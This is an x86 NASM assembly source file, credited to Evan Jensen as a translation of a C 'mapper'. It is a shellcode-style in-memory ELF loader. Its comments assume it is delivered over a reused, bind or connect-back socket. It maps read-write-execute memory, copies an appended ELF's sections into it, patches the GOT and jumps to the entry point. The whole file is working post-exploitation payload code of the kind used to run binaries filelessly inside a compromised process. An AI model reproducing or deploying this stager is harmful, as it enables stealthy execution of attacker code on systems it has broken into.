	;; Evan Jensen
	;; Translation of mapper.c by kiwiz
	
;;;  %eax = syscall number
;;;  args = %ebx, %ecx, %edx, %esi, %edi, %ebp (last can be ptr to > 6)
	
BITS 32
	global main


	%include "../include/short32.s"
	%include "../include/elf.s"
	%define PROT_READ      	0x4	
	%define PROT_WRITE      0x2
	%define PROT_EXEC      	0x1
	%define MAP_PRIVATE	0x2  ; Changes are private.
	%define MAP_ANONYMOUS 	0x20 ; no file backing
	%define MAP_FIXED      	0x10 ; use exact address
	%define PGSZ 		0x1000
	;; hex(sum(map(lambda a:1<<a,[1,2,3,4,5,6,7,9,10,11])))
	%define IMPORTANT_SECTIONS 0xefe
	%define ELFHEADER 0x464c457f
	
	
main:
	;; possible techniques for identifying where data is coming from
	;; socket reuse, bind, connectback, attached at the end of our code
	;; assume socket reuse with socket in EBX
	push ebx
	
	
	;; get some memory to work with
	xor eax,eax
	mov al,mmap2
	xor ebx,ebx 		;addr, don't care
	xor ecx,ecx
	inc ecx
	shl ecx,15		;0x8000 potentially compute at runtime
	xor edx,edx
	mov dl, PROT_READ|PROT_WRITE|PROT_EXEC
	xor esi,esi
	or esi, byte MAP_PRIVATE | MAP_ANONYMOUS
	xor edi, edi
	dec edi			;-1
	xor ebp,ebp
	
	;;   mmap(0, 0x8000, 0x7, MAP_PRIVATE | MAP_ANONYMOUS ,-1,0)
	call [gs:0x10]		;__kernel_vsyscall
	cld
	;; int 0x80
	
	jmp ENDOFCODE
	have_elf:
	pop ebp			;pointer to elf header
	mov edi,eax		; edi is pointer to the mapped memory	
;;;Elf32_Shdr* strtab = mem + ehdr->e_shoff + ehdr->e_shstrndx * ehdr->e_shentsize;
	mov esi, [ebp+e_shoff]
	movzx ebx, word [ebp+e_shstrndx]
	movzx ecx, word [ebp+e_shentsize]
	imul ebx,ecx
	add esi,ebp
	add esi,ebx
	push esi
	;; esi=strtab


	mov ebx,edi		;hold a pointer to our memory in ebx


	;; create memory sections
	
	movzx edx,word [ebp+e_shnum]	;counter
	dec edx
create_memory_sections:
;;;     Elf32_Shdr* shdr = mem + ehdr->e_shoff + ehdr->e_shentsize * i;
	movzx eax, word [ebp+e_shentsize]
	imul eax, edx
	add eax,dword [ebp+e_shoff]
	add eax,ebp
	;; eax=shdr
	mov esi,1
	mov ecx, dword [eax+sh_type]
	
	;; cmp ecx,0xff
	;; ja next_section
	;; shl esi,cl
	;; test esi, IMPORTANT_SECTIONS
	;; jz next_section
	
	;; this is a section we care about. Lets fix it up!
	;; find the name, maybe this is the .got.plt
	
	mov esi,[esp]		;strtab
	mov esi,dword [esi+sh_offset]
	add esi,dword [eax+sh_name]
	add esi,ebp
	jmp get_got_plt
have_got_plt:	
	pop edi
	mov ecx,got_plt_end - got_plt-1 ;length of the .got.plt string
	
	repe cmpsb
	test ecx,ecx
	jnz not_got_plt
	push eax		;got_plt section
	
not_got_plt:	
	;; not .got.plt but still important
	mov edi,dword [eax+sh_addr]
	add edi,ebx		;destination (mmap'd memory)
	mov esi,dword [eax+sh_offset]
	add esi,ebp		;src, the memory at the end of this asm
	mov ecx,dword [eax+sh_size]	;length of the section
	rep movsb
next_section:	
	dec edx
	jns create_memory_sections ;will loop when the counter is zero


begin_got_fix:	
	mov eax,[esp]		;got_plt section
	;;   size_t got_sz = got_plt->sh_size / sizeof(void*) - 3;
	mov ecx,dword [eax+sh_size]
	shr ecx,2
	;; sub ecx,3
	mov eax,dword [eax+sh_addr]
	add eax,ebx
	dec ecx
fix_got_loop:
	add [eax+ecx*4],ebx
	;; ecx=got_sz + 3
	;; the first three elements in the GOT should not be fixed here
	;; we need to fix up the GOT. The entries in the got need to point to
	;; the resolve function but currently they contain only RVA's
	
next_got_entry:
	dec ecx
	cmp ecx,2
	ja fix_got_loop

	;; get entry point
	mov eax,dword [ebp+e_entry]
	add eax,ebx
	call eax			;entrypoint
	hlt
	

get_got_plt:	
call have_got_plt
got_plt:	db ".got.plt",0
got_plt_end:
ENDOFCODE:
 	call have_elf
	;; for debugging we need to find the elf header
	
;; findelfheader:			
;; 	call $+5
;; 	pop eax
;; 	add eax,0x20		;ignore this code
;; .test:
;;         mov ecx,dword [eax]
;;         cmp ecx,ELFHEADER
;;         jz findelfheader.fin
;;         inc eax
;;         jmp findelfheader.test
;;  .fin:
;;         push eax
;; 	jmp have_elf
	
	